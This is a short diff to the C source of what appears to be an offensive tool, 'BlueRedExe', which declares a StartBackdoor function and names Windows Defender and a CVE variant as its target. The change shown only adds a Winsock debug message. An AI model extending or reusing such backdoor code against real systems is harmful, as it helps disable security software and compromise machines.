@@ -10,6 +10,10 @@ BOOL StartBackdoor(void);
 int main(void) {
     // 1. Initialize Winsock
     InitializeWinsock();
+    if (wsaInitResult != 0) {
+        printf("[DEBUG] WSAStartup failed: %lu\n", (unsigned long)wsaInitResult);
+        fflush(stdout);
+    }
 
     printf("=== BlueRedExe v1.0 Started ===\n");
     printf("Target: Windows Defender / WDF Filter (CVE-2026-33825 Variant)\n");
